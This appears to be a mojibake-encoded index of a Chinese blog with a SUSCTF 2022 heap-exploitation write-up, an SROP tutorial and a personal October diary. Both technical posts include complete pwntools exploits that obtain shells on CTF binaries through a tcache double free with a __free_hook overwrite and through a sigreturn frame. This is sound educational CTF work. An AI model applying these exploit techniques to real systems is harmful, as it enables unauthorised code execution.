[{"categories":["CTF"],"content":" è®¸ä¹…æœªæ›´æ–°äº†hhh æœ¬æ¬¡susctf2022é‡åˆ°ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„å †é¢˜ï¼Œæ¯”èµ›çš„æ—¶å€™æ„£æ˜¯çœ‹äº†ä¸€ä¸ªä¸‹åˆæ²¡åšå‡ºæ¥ï¼Œåªå¥½èµ›åå€Ÿç€å®˜æ–¹wpå¤ç°ä¸€æ³¢äº†ã€‚ ","date":"2022-03-03","objectID":"/2022-03-03-susctf2022-happytree/:0:0","series":null,"tags":["CTF","pwn","Heap"],"title":"Susctf2022 Happytree","uri":"/2022-03-03-susctf2022-happytree/#"},{"categories":["CTF"],"content":"åŸºç¡€check ç¨‹åºä¿æŠ¤å…¨å¼€ â¯ checksec ./happytree [*] '/home/leo/ctfs/ph0t1n1a/2022/susctf2022/pwn/happytree/happytree' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled libcç‰ˆæœ¬2.27ï¼Œæ„å‘³ç€tcacheç»“æ„åªæœ‰nextæŒ‡é’ˆï¼Œå¯ä»¥double freeï¼Œunsorted bin attackæ— é˜²æŠ¤ã€‚ â¯ ./libc.so.6 GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.2) stable release version 2.27. Copyright (C) 2018 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. Compiled by GNU CC version 7.5.0. libc ABIs: UNIQUE IFUNC For bug reporting instructions, please see: \u003chttps://bugs.launchpad.net/ubuntu/+source/glibc/+bugs\u003e. ","date":"2022-03-03","objectID":"/2022-03-03-susctf2022-happytree/:0:0","series":null,"tags":["CTF","pwn","Heap"],"title":"Susctf2022 Happytree","uri":"/2022-03-03-susctf2022-happytree/#åŸºç¡€check"},{"categories":["CTF"],"content":"åŠŸèƒ½ å…ˆä¸¢IDAï¼Œå‘ç°æ˜¯ä¸€ä¸ªç”¨äºŒå‰æœç´¢æ ‘æ¥ç»„ç»‡å †å—çš„ç¨‹åºã€‚ï¼ˆæˆ‘tmçœ‹äº†è¿‘ä¸€å°æ—¶æ‰çœ‹å‡ºæ¥ï¼‰ ç¨‹åºæä¾›ä¸‰ä¸ªåŠŸèƒ½ï¼šinsert/delete/showï¼Œä¸‰ä¸ªå‡½æ•°çš„å‚æ•°éƒ½æ˜¯ç”¨æˆ·è¾“å…¥çš„sizeï¼Œè€Œä¸æ˜¯æ™®é€šå †é¢˜çš„indexä¹‹ç±»çš„ã€‚ å¤§è‡´æ¦‚æ‹¬å°±æ˜¯ï¼š æ¯æ¬¡insertæ“ä½œä¼šåˆ›å»ºä¸¤ä¸ªå †å—ï¼Œä¸€ä¸ªæ˜¯å›ºå®šå¤§å°0x30çš„ç®¡ç†å †å—ï¼Œä¸€ä¸ªæ˜¯ç”±ç”¨æˆ·è¾“å…¥å¤§å°è€Œç¡®å®šçš„ä¸å›ºå®šå¤§å°å †å—ã€‚ç®¡ç†å †å—ä¸­å­˜å‚¨ç”¨æˆ·è¾“å…¥çš„å¤§å°ï¼ŒæŒ‡å‘å†…å®¹å †å—çš„æŒ‡é’ˆï¼Œå·¦å„¿å­èŠ‚ç‚¹å’Œå³å„¿å­èŠ‚ç‚¹ã€‚æ‰€æœ‰çš„ç®¡ç†å †å—æ„æˆä¸€æ£µäºŒå‰æœç´¢æ ‘ï¼Œæœ€å…ˆåˆ›å»ºçš„ç®¡ç†å †å—æ˜¯æ ‘çš„æ ¹èŠ‚ç‚¹ï¼Œbssæ®µçš„0x2022a0åœ°å€å¤„å­˜å‚¨äº†æ ¹èŠ‚ç‚¹çš„åœ°å€ã€‚insertä¸­çš„sizeå‚æ•°å­˜åœ¨unsigned int8é™åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”³è¯·å †å—çš„èŒƒå›´å°±æ˜¯[0, 0xff]ã€‚ -------------- | | 0x31 | | ---- | ---- | | size | ptr | | ---- | ---- | | left | right| -------------- deleteæ“ä½œä¼šå¯»æ‰¾åˆ°ä¸è¾“å…¥sizeç›¸åŒçš„èŠ‚ç‚¹ï¼Œç„¶ååˆ¤æ–­å…¶æ˜¯å¦å«æœ‰å·¦å³å„¿å­èŠ‚ç‚¹ï¼š å¦‚æœå·¦å³å„¿å­èŠ‚ç‚¹éƒ½å­˜åœ¨ï¼Œåˆ™æ‰¾åˆ°å³å­æ ‘ä¸­çš„æœ€å·¦å¶å­èŠ‚ç‚¹ï¼Œå°†æœ€å·¦å¶å­èŠ‚ç‚¹è®°å½•çš„sizeå¡«å†™åˆ°å½“å‰èŠ‚ç‚¹ä¸­ï¼Œç„¶åå»freeé‚£ä¸ªæœ€å·¦å¶å­èŠ‚ç‚¹çš„ä¸¤ä¸ªå †å—ã€‚ å¦åˆ™ï¼Œé‡Šæ”¾æ”¹èŠ‚ç‚¹å¯¹åº”çš„å †å—ï¼Œç„¶åè¿”å›èŠ‚ç‚¹å­˜å‚¨çš„å·¦/å³å­èŠ‚ç‚¹åœ°å€ï¼ˆæˆ–è€…0ï¼‰ã€‚ showæ“ä½œå°±æ˜¯æ‰¾åˆ°ä¸è¾“å…¥sizeç›¸åŒçš„èŠ‚ç‚¹ï¼Œç„¶åæ‰“å°ã€‚ ","date":"2022-03-03","objectID":"/2022-03-03-susctf2022-happytree/:0:0","series":null,"tags":["CTF","pwn","Heap"],"title":"Susctf2022 Happytree","uri":"/2022-03-03-susctf2022-happytree/#åŠŸèƒ½"},{"categories":["CTF"],"content":"æ¼æ´ç‚¹ æ¼æ´ç‚¹åœ¨äºï¼Œå½“æ‰§è¡Œdeleteæ“ä½œæ—¶ï¼Œå¯¹äºå°†è¦freeçš„èŠ‚ç‚¹ï¼Œç¨‹åºå¹¶æ²¡æœ‰æ¸…ç©ºå…¶ä¸­å¯èƒ½å­˜åœ¨çš„å·¦å³å„¿å­èŠ‚ç‚¹æŒ‡é’ˆï¼ˆå³ç¨‹åºä¸­çš„a2[2]/a2[3]ï¼‰ï¼Œå½“é‡Šæ”¾ç„¶ååˆåˆ†é…å›æ¥åï¼Œå°±ä¼šæœ‰ä¸¤ä¸ªèŠ‚ç‚¹çš„æŒ‡å‘åŒä¸€ä¸ªå„¿å­èŠ‚ç‚¹ï¼Œæ„æˆdouble freeã€‚ deleteå‡½æ•°Untitled \" deleteå‡½æ•° å†åŠ ä¸Š[0, 0xff]çš„èŒƒå›´å·²ç»å¯ä»¥è®©æˆ‘ä»¬é‡Šæ”¾chunkè¿›å…¥unsorted binä¸­ï¼Œæ‰€ä»¥æ³„éœ²Libcä¹Ÿæ˜¯å¯è¡Œçš„ã€‚ ","date":"2022-03-03","objectID":"/2022-03-03-susctf2022-happytree/:0:0","series":null,"tags":["CTF","pwn","Heap"],"title":"Susctf2022 Happytree","uri":"/2022-03-03-susctf2022-happytree/#æ¼æ´ç‚¹"},{"categories":["CTF"],"content":"expåˆ†æ #!/usr/bin/python3 from pwn import * context.log_level = 'debug' context.terminal = ['tmux', 'splitw', '-h'] host = '124.71.147.225' port = 9999 elfpath = 'happytree_patched' libcpath = 'libc.so.6' e = ELF(elfpath) context.binary = e libc = ELF(libcpath) context.binary = e if args.LOCAL: p = process([e.path]) # gdb.attach(p) else: p = remote(host, port) # io def s(c): return p.send(c) def sl(c): return p.sendline(c) def r(n): return p.recv(n) def rn(n): return p.recvn(n) def ru(pattern, drop=False): return p.recvuntil(pattern, drop=drop) def rl(): return p.recvline() def ru7f(): return p.recvuntil(b'\\x7f') def su(x): return p.success(x) def shell(): return p.interactive() # utilities def leak(func, address): return p.success( \"{}==\u003e {}\".format(func, hex(address))) def command(c): ru(b'cmd\u003e ') sl(str(c).encode()) def insert(size, content=b'a'): command(1) ru(b'data: ') sl(str(size).encode()) ru(b'content: ') s(content) def delete(size): command(2) ru(b'data: ') sl(str(size).encode()) def show(size): command(3) sl(str(size).encode()) # ru(b'content: ') # start pwning insert(1) insert(2) insert(8, b'/bin/sh\\x00') # use unsorted bin to leak libc for i in range(8): insert(0xd0 + i) for i in range(8): delete(0xd7 - i) # 1 -\u003e 2 -\u003e 8 for i in range(7): insert(0xd0 + i) insert(0xd7, b'a'*8) show(0xd7) leakaddr = u64(ru7f()[-6:].ljust(8, b'\\x00')) libc_base = leakaddr - (0x7f8246ba2ca0 - 0x7f82467b7000) leak(\"libc base\", libc_base) libc.address = libc_base free_hook = libc.sym['__free_hook'] system = libc.sym['system'] # double free insert(0xf2) insert(0xf7) insert(0xf6) insert(0xf4) insert(0xf5) insert(0xf0) insert(0xf1) # æ„é€ double free delete(0xf2) insert(0xf8) delete(0xf5) delete(0xf8) delete(0xf7) # å¡«å……ä¸¤ä¸ªæ­£å¸¸çš„0x30 tcache bin delete(1) delete(2) # åˆ©ç”¨æ„é€ å¥½çš„tcache[0x100]ä¸­çš„double freeæ¥ä¿®æ”¹free_hook insert(0xef, p64(free_hook)) insert(0xee, p64(0)) insert(0xed, p64(0)) gdb.attach(p) insert(0xec, p64(system)) delete(8) shell() åˆ©ç”¨unsorted binæ³„éœ²libcä¹‹åï¼ŒäºŒå‰æ ‘çš„éƒ¨åˆ†å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚æ¥ç€çš„delete(0xf2)æ“ä½œå®é™…ä¸Šåˆ é™¤çš„æ˜¯0xf4å¤§å°çš„èŠ‚ç‚¹ï¼Œå¹¶å°†0xf2èŠ‚ç‚¹è®°å½•çš„sizeæ”¹å†™ä¸º0xf4ã€‚ æµç¨‹1Untitled \" æµç¨‹1 æ‰€ä»¥ï¼Œç´§æ¥ç€çš„insert(0xf8)ä¼šå¾—åˆ°ä¸€ä¸ªæ®‹ç•™æœ‰0xf5èŠ‚ç‚¹æŒ‡é’ˆçš„èŠ‚ç‚¹ï¼Œè€Œå› ä¸ºä¹‹å‰çš„delete(0xf2)æ“ä½œï¼Œ0xf6åŒæ ·ä¼šæŒ‡å‘0xf5èŠ‚ç‚¹ã€‚ æµç¨‹2Untitled \" æµç¨‹2 ç„¶ådelete(0xf5)ä¼šæœç´¢åˆ°0xf6å·¦å­æ ‘ä¸­çš„0xf5èŠ‚ç‚¹ï¼Œç„¶ååˆ é™¤å…¶å¯¹åº”çš„å †å—ã€‚æ­¤æ—¶çš„æ ‘ä¸tcacheçš„æƒ…å†µå¦‚å›¾æ‰€ç¤ºã€‚ æµç¨‹3Untitled \" æµç¨‹3 æ¥ç€delete(0xf8)å°†0xf5ç§»åŠ¨åˆ°0xf7çš„å³å­æ ‘ã€‚ æµç¨‹4Untitled \" æµç¨‹4 å› ä¸º0xf7èŠ‚ç‚¹çš„å·¦å³å¶å­èŠ‚ç‚¹å‡å­˜åœ¨ï¼Œæ‰€ä»¥delete(0xf7)æ“ä½œåˆä¼šæœç´¢åˆ°0xf5èŠ‚ç‚¹ç„¶åå†æ¬¡å°†å…¶åˆ é™¤ã€‚æ­¤æ—¶ï¼Œtcacheä¸­å·²ç»äº§ç”Ÿäº†double freeã€‚ æµç¨‹5Untitled \" æµç¨‹5 è°ƒè¯•éªŒè¯Untitled \" è°ƒè¯•éªŒè¯ æ¥ä¸‹æ¥å°±æ˜¯å¸¸è§„çš„tcache double freeåº”ç”¨ï¼Œæœ€ç»ˆæ”¹free_hookç„¶ågetshellã€‚ ","date":"2022-03-03","objectID":"/2022-03-03-susctf2022-happytree/:0:0","series":null,"tags":["CTF","pwn","Heap"],"title":"Susctf2022 Happytree","uri":"/2022-03-03-susctf2022-happytree/#expåˆ†æ"},{"categories":["CTF"],"content":"æ€»ç»“ ç¬¬ä¸€æ¬¡ç¢°åˆ°è¿™ç§ç»“åˆæ•°æ®ç»“æ„æ¥å‡ºçš„å †é¢˜ï¼Œæ´è—å¾—æŒºéšè”½çš„ï¼ˆä¸æ˜¯ï¼Œå…¶å®æœ‰ç»éªŒçš„è¯ä¸€çœ¼å°±èƒ½çœ‹å‡ºæ¥ï¼‰ï¼Œè€Œä¸”åˆ›å»ºå’Œé‡Šæ”¾å †å—çš„æ“ä½œè¿˜éœ€è¦é€‰æ‰‹å»å¤ä¹ ä¸€æ³¢äºŒå‰æœç´¢æ ‘çš„æ€§è´¨ï¼Œæ‰€ä»¥æ€»ä½“æ¥è¯´æ˜¯ä¸€é“éå¸¸æœ‰è¶£çš„é¢˜ï¼Œç‰¹æ­¤è®°å½•ä¸€ä¸‹ã€‚ ","date":"2022-03-03","objectID":"/2022-03-03-susctf2022-happytree/:0:0","series":null,"tags":["CTF","pwn","Heap"],"title":"Susctf2022 Happytree","uri":"/2022-03-03-susctf2022-happytree/#æ€»ç»“"},{"categories":["CTF"],"content":"SROPï¼Œå¬ç€ä¼¼ä¹æ˜¯ä¸€ä¸ªéå¸¸é«˜å¤§ä¸Šçš„ROPæ–¹å¼ï¼Œå†åŠ ä¸Šæ¶‰åŠåˆ°signalå’Œå†…æ ¸ç­‰æ¦‚å¿µï¼Œå¾ˆå®¹æ˜“ç»™äººä¸€ç§éš¾ä»¥ç†è§£çš„ç¬¬ä¸€å°è±¡ã€‚ä½†çœ‹è¿‡ctf-wikiä¹‹åä½ ä¼šå‘ç°ï¼ŒåŸç†éå¸¸ç®€å•æ˜“æ‡‚ã€‚ ","date":"2021-11-01","objectID":"/2021-11-01-srop%E5%AD%A6%E4%B9%A0/:0:0","series":null,"tags":["CTF","pwn","Linux","Signal","Kernel"],"title":"pwnåˆå­¦è€…çš„è¿›é˜¶ï¼ˆå››ï¼‰ï¼šSROP","uri":"/2021-11-01-srop%E5%AD%A6%E4%B9%A0/#"},{"categories":["CTF"],"content":"åŸºæœ¬åŸç† SROPä¸Unixç³»ç»Ÿçš„ä¿¡å·ï¼ˆsignalï¼‰å¤„ç†æœºåˆ¶ç›¸å…³ã€‚å…³äºUnixç³»ç»Ÿçš„ä¿¡å·å¤„ç†ã€ä¸­æ–­ã€ç”¨æˆ·æ€å†…æ ¸æ€ç­‰æ¦‚å¿µï¼Œå¿˜äº†çš„è¯å»ºè®®å…ˆå»googleä¸€ä¸‹ã€‚ç†è§£è¿™äº›ä¸œè¥¿æ‰èƒ½å¤Ÿæ›´å¥½åœ°ç†è§£SROPçš„å·¥ä½œåŸç†ã€‚ é¦–å…ˆç›—ä¸€å¼ ctf-wikiä¸Šå…³äºä¿¡å·å¤„ç†è¿‡ç¨‹çš„æµç¨‹å›¾ã€‚ Procedure of signal handlingimg \" Procedure of signal handling å‡ ä¸ªé˜¶æ®µåˆ†åˆ«å‘ç”Ÿäº†ä»€ä¹ˆï¼š â‘ ï¼šç”¨æˆ·æ€è¿›ç¨‹æ¥æ”¶åˆ°åˆ«çš„è¿›ç¨‹å‘é€çš„ä¿¡å·signalï¼Œè¯¥è¿›ç¨‹è¢«æŒ‚èµ·ï¼Œè¿›å…¥å†…æ ¸æ€ â‘¡ï¼šå†…æ ¸ä¿å­˜ç”¨æˆ·æ€è¿›ç¨‹çš„ä¸Šä¸‹æ–‡ï¼Œç„¶åè·³è½¬åˆ°ç”¨æˆ·æ€çš„ä¿¡å·å¯¹åº”çš„ä¿¡å·å¤„ç†ç¨‹åºï¼Œå›åˆ°ç”¨æˆ·æ€ã€‚åœ¨è¿™ä¸€é˜¶æ®µé‡Œï¼Œå†…æ ¸ä¼šæ„é€ ä¸€ä¸ªä½äºç”¨æˆ·æ€è¿›ç¨‹æ ˆä¸Šçš„Signal Frameç”¨äºå­˜æ”¾è¯¥è¿›ç¨‹çš„ä¸Šä¸‹æ–‡ï¼Œç„¶åå†å‹å…¥è¿”å›åœ°å€rt_sigreturnã€‚ â‘¢ï¼šç”¨æˆ·æ€çš„ä¿¡å·å¤„ç†ç¨‹åºæ‰§è¡Œå®Œæ¯•ï¼Œpopè¿”å›åœ°å€rt_sigreturnï¼Œè¿›ç¨‹è¿›å…¥å†…æ ¸æ€ï¼Œæ‰§è¡Œsigreturnç³»ç»Ÿè°ƒç”¨ã€‚å†…æ ¸æ ¹æ®ä¹‹å‰æ ˆä¸Šçš„Signal Frameå®Œæˆç”¨æˆ·æ€è¿›ç¨‹ä¸Šä¸‹æ–‡çš„æ¢å¤ã€‚ â‘£ï¼šè¿”å›ç”¨æˆ·æ€ï¼Œè¿›ç¨‹æŒ‰ç…§æ¢å¤çš„ä¸Šä¸‹æ–‡ç»§ç»­æ‰§è¡Œã€‚ SROPä½œç”¨äºç¬¬3é˜¶æ®µï¼Œä¹Ÿå°±æ˜¯å†…æ ¸æ ¹æ®Signal Frameçš„å†…å®¹æ¢å¤è¿›ç¨‹ä¸Šä¸‹æ–‡çš„è¿‡ç¨‹ã€‚ Signal Frameæ˜¯ä¸€ä¸ªå·²çŸ¥çš„æ•°æ®ç»“æ„ï¼Œè€Œä¸”å…¶å­˜åœ¨äºç”¨æˆ·æ€çš„æ ˆä¸Šã€‚å†…æ ¸åœ¨æ¢å¤ä¸Šä¸‹æ–‡æ—¶å¹¶æ²¡æœ‰ç¡®ä¿å…¶å†…å®¹æ²¡æœ‰è¢«ä¿®æ”¹è¿‡ã€‚å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿåœ¨æ ˆä¸Šæ„é€ sigreturnç³»ç»Ÿè°ƒç”¨ä¸Signal Frameç»“æ„ä½“çš„è¯ï¼Œå°±èƒ½å¤Ÿå®ç°æ”»å‡»çš„æ•ˆæœã€‚ æ¯”å¦‚åœ¨æ ˆä¸Šæ„é€ è¿™ä¹ˆä¸€ä¸ªç»“æ„ï¼Œå°±èƒ½å¤ŸSROPè·å–shellã€‚ example\" example ","date":"2021-11-01","objectID":"/2021-11-01-srop%E5%AD%A6%E4%B9%A0/:1:0","series":null,"tags":["CTF","pwn","Linux","Signal","Kernel"],"title":"pwnåˆå­¦è€…çš„è¿›é˜¶ï¼ˆå››ï¼‰ï¼šSROP","uri":"/2021-11-01-srop%E5%AD%A6%E4%B9%A0/#åŸºæœ¬åŸç†"},{"categories":["CTF"],"content":"ä¾‹é¢˜ Buuä¸Šçš„ciscn_2019_es_7å°±æ˜¯ä¸€ä¸ªå…¸å‹çš„ä¾‹å­ã€‚ ç¨‹åºå…è®¸0x400-0x10é•¿åº¦çš„æ ˆæº¢å‡ºï¼Œå¹¶ä¸”æä¾›äº†mov rax 0x3b; retå’Œsyscallä»¥åŠpop rdi/pop rsiçš„gadgetï¼Œä½†æ˜¯å°±æ˜¯æ²¡æœ‰æ§åˆ¶rdxçš„gadgetã€‚æ‰€ä»¥æ— æ³•ç›´æ¥æ ˆæº¢å‡ºret2syscallã€‚ å†è€ƒè™‘åˆ°è¿™ä¹ˆé•¿çš„æº¢å‡ºé•¿åº¦ï¼Œä»¥åŠmov rax 0x0f; retçš„gadgetï¼ˆ0xfå·ç³»ç»Ÿè°ƒç”¨å°±æ˜¯sigreturnï¼‰ï¼Œæ‰€ä»¥åº”è¯¥æƒ³åˆ°SROPã€‚ gadgetsimage-20211101200337067 \" gadgets æ ¹æ®ä¸Šé¢çš„ä¾‹å­ï¼Œå¦‚æœæƒ³è¦SROPæ‰§è¡Œexecve(\"/bin/sh\", 0, 0)çš„è¯ï¼Œè¿˜éœ€è¦çŸ¥é“å­—ç¬¦ä¸²\"/bin/sh\"çš„åœ°å€ã€‚åœ¨è¿™é“é¢˜ä¸­ï¼Œå¯ä»¥åˆ©ç”¨sys_writeè¾“å‡ºçš„æ ˆåœ°å€æ¥è·å–ã€‚ æœ€ç»ˆexpï¼š from pwn import * context(log_level = 'debug') context(os=\"linux\", arch=\"amd64\") if args.LOCAL: p = process('./ciscn_2019_es_7') else: p = remote('node4.buuoj.cn', 26270) syscall_ret = 0x400517 mov_rax_0x3b_ret = 0x4004e2 # execve mov_rax_0x0f_ret = 0x4004da # sigreturn main_addr = 0x40051d call_vuln = 0x400531 vuln_addr = 0x4004f1 # first time pld1 = b'/bin/sh\\x00' pld1 = pld1.ljust(0x10, b'a') pld1 += p64(vuln_addr) p.send(pld1) stack_addr = u64(p.recvuntil(b'\\x7f')[-6:]+b'\\x00'*2) p.success(\"stack_addr: {}\".format(hex(stack_addr))) # second time pld2 = b'/bin/sh\\x00' pld2 = pld2.ljust(0x10, b'a') pld2 += p64(mov_rax_0x0f_ret) pld2 += p64(syscall_ret) sigframe = SigreturnFrame() sigframe.rax = constants.SYS_execve sigframe.rdi = stack_addr - 0x118 sigframe.rsi = 0 sigframe.rdx = 0 sigframe.rsp = stack_addr sigframe.rip = syscall_ret # print(sigframe) pld2 += bytes(sigframe) p.send(pld2) p.interactive() æ‰§è¡Œæˆªå›¾ It worksimage-20211101203955060 \" It works ","date":"2021-11-01","objectID":"/2021-11-01-srop%E5%AD%A6%E4%B9%A0/:2:0","series":null,"tags":["CTF","pwn","Linux","Signal","Kernel"],"title":"pwnåˆå­¦è€…çš„è¿›é˜¶ï¼ˆå››ï¼‰ï¼šSROP","uri":"/2021-11-01-srop%E5%AD%A6%E4%B9%A0/#ä¾‹é¢˜"},{"categories":["CTF"],"content":"æ€è€ƒ å¦‚æœSignal Frameå®Œå…¨å¯æ§çš„è¯ï¼Œæ—¢ç„¶å¯ä»¥é€šè¿‡æ§åˆ¶raxå’Œripæ¥æ‰§è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œé‚£ä¹ˆå¦‚æœç¨‹åºä¸­å­˜åœ¨ä»€ä¹ˆåé—¨å‡½æ•°çš„è¯ï¼Œæ˜¯ä¸æ˜¯å¯ä»¥é€šè¿‡æ„é€ rdi/rsiå’Œripç­‰å¯„å­˜å™¨ï¼Œå»æ‰§è¡Œè¿™äº›å‡½æ•°å‘¢ï¼Ÿè¿˜æ˜¯è¯´å†…æ ¸æ€ä¼šé™åˆ¶ä¸€äº›å‡½æ•°çš„è¿è¡Œï¼Ÿ ","date":"2021-11-01","objectID":"/2021-11-01-srop%E5%AD%A6%E4%B9%A0/:3:0","series":null,"tags":["CTF","pwn","Linux","Signal","Kernel"],"title":"pwnåˆå­¦è€…çš„è¿›é˜¶ï¼ˆå››ï¼‰ï¼šSROP","uri":"/2021-11-01-srop%E5%AD%A6%E4%B9%A0/#æ€è€ƒ"},{"categories":["CTF"],"content":"å‚è€ƒé“¾æ¥ï¼š https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/ https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/ æå‡ºSROPçš„è®ºæ–‡ï¼šã€ŠFraming Signalsâ€”A Return to Portable Shellcodeã€‹ ","date":"2021-11-01","objectID":"/2021-11-01-srop%E5%AD%A6%E4%B9%A0/:4:0","series":null,"tags":["CTF","pwn","Linux","Signal","Kernel"],"title":"pwnåˆå­¦è€…çš„è¿›é˜¶ï¼ˆå››ï¼‰ï¼šSROP","uri":"/2021-11-01-srop%E5%AD%A6%E4%B9%A0/#å‚è€ƒé“¾æ¥"},{"categories":["éšæ„çš„æ–‡å­—"],"content":"æœˆæœ«çš„ä¸€ç‚¹ç‚¹æ–‡å­—â€¦ ","date":"2021-10-28","objectID":"/2021-10-28-10%E6%9C%88%E5%B0%8F%E7%BB%93/:0:0","series":null,"tags":["Life","ç”Ÿæ´»","éšç¬”","æ…¢èŠ‚å¥"],"title":"10æœˆéšç¬”","uri":"/2021-10-28-10%E6%9C%88%E5%B0%8F%E7%BB%93/#"},{"categories":["éšæ„çš„æ–‡å­—"],"content":"å…¥å†¬ ä»Šå¤©æ˜¯10.28æ—¥ï¼Œ10æœˆå°±å¿«è¦è¿‡å»äº†ã€‚åœ¨è¿™ä¸ªæœˆé‡Œï¼Œå¤©æ°”æ¸æ¸è½¬å‡‰ï¼Œä¸Šæµ·åœ¨æŸä¸€å¤©ç›´æ¥ä»å¤å¤©è½¬åˆ°äº†æ·±ç§‹ã€‚ä¸æ­¢ä¸Šæµ·ï¼Œå…¨å›½å„åœ°çš„å¤©æ°”ä¼¼ä¹ä¹Ÿéƒ½åœ¨å„è‡ªçš„â€œæŸä¸€å¤©â€é‡Œç¬é—´è½¬å‡‰ï¼Œâ€œä¸€ç§’å…¥å†¬â€çš„æ¢—åœ¨ç½‘ç»œä¸Šæˆä¸ºäº†ä¸€æ—¶çš„çƒ­è¯ã€‚å†¬å¤©çš„è¿‡æ—©åˆ°æ¥ä¼¼ä¹ä¹Ÿä¸10æœˆè¿™ä¸ªæœˆä»½æ ¼æ ¼ä¸å…¥ï¼Œæœ‰ç§é›¨ä¸‹é”™äº†å­£å€™çš„æ„Ÿè§‰ï¼Œç»™äººä»¥é”™ä¹±ä¸”å¥‡å¦™çš„æ°›å›´ã€‚å†åŠ ä¸Šæœ€è¿‘å‡ å¤©è¿˜çœ‹åˆ°äº†ã€Œæ‹‰å°¼å¨œå¹´ã€çš„ç›¸å…³æ–°é—»ï¼Œæƒ³å¿…ä»Šå¹´çš„å†¬å¤©ä¹Ÿä¼šæ¯”è¾ƒå¯’å†·å§ã€‚ ","date":"2021-10-28","objectID":"/2021-10-28-10%E6%9C%88%E5%B0%8F%E7%BB%93/:1:0","series":null,"tags":["Life","ç”Ÿæ´»","éšç¬”","æ…¢èŠ‚å¥"],"title":"10æœˆéšç¬”","uri":"/2021-10-28-10%E6%9C%88%E5%B0%8F%E7%BB%93/#å…¥å†¬"},{"categories":["éšæ„çš„æ–‡å­—"],"content":"10æœˆå›é¡¾ æ€»çš„æ¥è¯´ï¼Œ10æœˆæ˜¯è¾ƒä¸ºå¿™ç¢Œçš„ä¸€ä¸ªæœˆã€‚æˆ‘å›æƒ³äº†ä¸€ä¸‹ï¼Œåœ¨è¿™ä¸ªæœˆé‡Œï¼Œæˆ‘ä¸»è¦å®Œæˆäº†3ä»¶äº‹ã€‚ ","date":"2021-10-28","objectID":"/2021-10-28-10%E6%9C%88%E5%B0%8F%E7%BB%93/:2:0","series":null,"tags":["Life","ç”Ÿæ´»","éšç¬”","æ…¢èŠ‚å¥"],"title":"10æœˆéšç¬”","uri":"/2021-10-28-10%E6%9C%88%E5%B0%8F%E7%BB%93/#10æœˆå›é¡¾"},{"categories":["éšæ„çš„æ–‡å­—"],"content":"å‚åŠ å©šç¤¼ 10æœˆ2å·æ˜¯è¡¨å“¥çš„å©šç¤¼ã€‚ä¸ºæ­¤ï¼Œæˆ‘9æœˆä»½å°±æå‰å’Œå¯¼å¸ˆè¯·å¥½äº†å‡ï¼Œåœ¨9æœˆåº•å›äº†å®¶ã€‚éšç€å¹´é¾„çš„å¢é•¿ï¼Œå©šç¤¼å‚åŠ å¾—ä¹Ÿè¶Šæ¥è¶Šå¤šã€‚çœ‹ç€æ›¾ç»å¸¦ç€è¿˜æ˜¯å°å±å­©çš„æˆ‘ç©æ¸¸æˆçš„å‡ ä½å“¥å“¥ï¼Œå¦‚ä»Šéƒ½å·²ç»æˆä¸ºäººå¤«ï¼Œèµ°å…¥å©šå§»æ®¿å ‚ã€‚ä½œä¸ºæ™šè¾ˆï¼Œå¿ƒé‡Œç”±è¡·çš„å¼€å¿ƒå’Œç¥ç¦æ˜¯è‚¯å®šçš„ï¼Œä½†åŒæ—¶ä¹Ÿå°‘ä¸äº†å‡ åˆ†æ„Ÿæ…¨ï¼Œå¿ƒæƒ³æ›¾ç»è¿˜æ˜¯å’Œæˆ‘ç°åœ¨ä¸€æ ·å¹´çºªçš„å°‘å¹´ï¼Œè½¬çœ¼é—´å°±å·²ç»ä¸‰åè€Œç«‹ï¼Œæˆä¸ºäº†ä¸€ä¸ªå®¶çš„ä¸­æµç ¥æŸ±ï¼Œè¦åŠªåŠ›å»é¢å¯¹ç”Ÿæ´»çš„å‹åŠ›ã€ç»è¥å©šå§»ä¸å®¶åº­ã€åˆ›é€ å¹¶æ•™è‚²ä¸‹ä¸€ä»£ï¼ˆåŸè°…æˆ‘æš‚æ—¶æƒ³ä¸å‡ºåˆ›é€ ä¹‹å¤–çš„è¯ï¼‰ã€‚è¿™äº›äº‹æƒ…ï¼Œå…‰æ˜¯æƒ³æƒ³å°±ä¸ç¦ä»¤äººç¥æƒ…è‚ƒç©†ï¼Œå¿ƒé‡Œæ€ä¹ˆä¹Ÿæ³›ä¸èµ·ä¸€ä¸è½»æ¾è°ƒä¾ƒçš„æƒ…ç»ªã€‚è¿™ä¹Ÿè¶Šå‘ä»¤æˆ‘æ„è¯†åˆ°æˆ‘æ­£å½“ä¸‹æ‰€æ‹¥æœ‰çš„é’æ˜¥å¹´åæ˜¯å¤šä¹ˆçš„å¯è´µã€‚ å‡†ç¡®çš„æ¥è¯´ï¼Œå©šç¤¼å…¶å®ä»æˆ‘å›å®¶ä¹‹å‰å°±å·²ç»å¼€å§‹äº†ã€‚ç½®åŠè¯·æŸ¬ã€é¢„å®šé…’åº—ã€è´­ä¹°å©šç¤¼ä¸Šè¦ç”¨çš„ç‰©èµ„ï¼Œè¿™äº›äº‹æƒ…åœ¨å©šç¤¼å¼€å§‹å‰ä¸€å‘¨åŸºæœ¬ä¸Šå°±å¾—å…¨éƒ¨å®‰æ’å¦¥å½“ã€‚åœ¨å›å®¶åçš„ç¬¬äºŒå¤©ï¼Œæˆ‘å°±è¢«å«å»å¸®å¿™å¹²æ´»äº†ã€‚è€Œæˆ‘å§‘å§‘ï¼Œä½œä¸ºæˆ‘å“¥çš„è€å¦ˆä»¥åŠå©šç¤¼çš„æ€»æŒ‡æŒ¥ï¼Œæ›´æ˜¯ä»æ—©å¿™åˆ°æ™šã€‚ä¸­å›½çš„çˆ¶æ¯æƒ³å¿…å¤§å¤šå¦‚æ­¤å§ï¼Œå°†æ¥æˆ‘çˆ¸å¦ˆåœ¨æˆ‘å©šç¤¼çš„æ—¶å€™ä¼°è®¡ä¹Ÿä¼šå¿™å¾—ç„¦å¤´çƒ‚é¢ã€‚ 